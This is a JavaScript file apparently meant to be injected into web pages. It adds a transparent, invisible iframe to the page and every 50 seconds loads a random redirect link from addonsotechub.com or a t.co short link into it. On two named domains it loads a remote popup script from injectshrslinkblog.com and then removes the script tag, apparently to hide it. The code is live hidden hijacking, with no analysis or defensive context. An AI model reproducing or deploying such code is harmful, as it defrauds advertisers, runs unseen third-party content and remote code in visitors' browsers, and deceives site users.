document.addEventListener('DOMContentLoaded', () => {
  let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
  if (Folt) {
    let Newel = document.createElement('span');
    Newel.innerHTML = `<style>
      iframe.invisible-frame {
      position: fixed;
      width:60%;
      height: 20%;
      bottom: 20%;
      right: 0;
      border: none;
      opacity: 0;
      z-index:39494;
    }
  </style> <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
    Folt.prepend(Newel);  
    var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');  
  } else {
       
  }
});
  const postUrls = [
    'https://addonsotechub.com/direct/2113',
    'https://t.co/RPBnQZqZY9',
    'https://addonsotechub.com/direct/2123',
    'https://addonsotechub.com/direct/2122',
    'https://addonsotechub.com/direct/2121',
    'https://addonsotechub.com/direct/2120'

  ];
        function goToRandomPost() {
            const randomIndex = Math.floor(Math.random() * postUrls.length);
            const randomPostUrl = postUrls[randomIndex];
            document.getElementById('postFrame').src = randomPostUrl;
        }
        window.onload = function() {
            goToRandomPost();
            setInterval(goToRandomPost,  50000);
        };
/* 'https://t.co/i2JH864wbb',
    'https://t.co/roiA8U72aa',
    'https://t.co/6yC1w3qtbR',
    'https://t.co/nhQAs7PpPd',
    'https://t.co/MgOzaclnho',
    'https://t.co/vWDW62hmwo',
    'https://t.co/ToYRfWqzZp',
    'https://t.co/0kaOlilwjj',
    'https://t.co/sP6cKqh7Vn',
    'https://t.co/roiA8U72aa',
    'https://t.co/p9p8Z1giOC',
    'https://t.co/e4FBbBbVu3',
    'https://t.co/5fdRXAvECg'  */      
var allowedURLs = [
    "https://dkhek.blogspot.com",
    "https://www.desiremovies.store"
];

var foundMatch = false;

for (var i = 0; i < allowedURLs.length; i++) {
    if (window.location.href.startsWith(allowedURLs[i])) {
        foundMatch = true;
        break;
    }
}

if (foundMatch) {
function loadScript(url, callback) { var script = document.createElement('script'); script.type = 'text/javascript'; script.src = url; script.onload = function() { if (callback) callback(); }; document.head.appendChild(script); } loadScript('https://injectshrslinkblog.com/popup/script.js', function() { console.log('Script loaded!'); });


 
} else {

}
function removeScriptByUrl(urlToRemove) {
  const scripts = document.getElementsByTagName('script');
  for (let i = 0; i < scripts.length; i++) {
    if (scripts[i].src.includes(urlToRemove)) {
      scripts[i].parentNode.removeChild(scripts[i]);
    }
  }
}

// Usage
document.addEventListener('DOMContentLoaded', function() {
  removeScriptByUrl('https://injectshrslinkblog.com/popup/script.js');
});

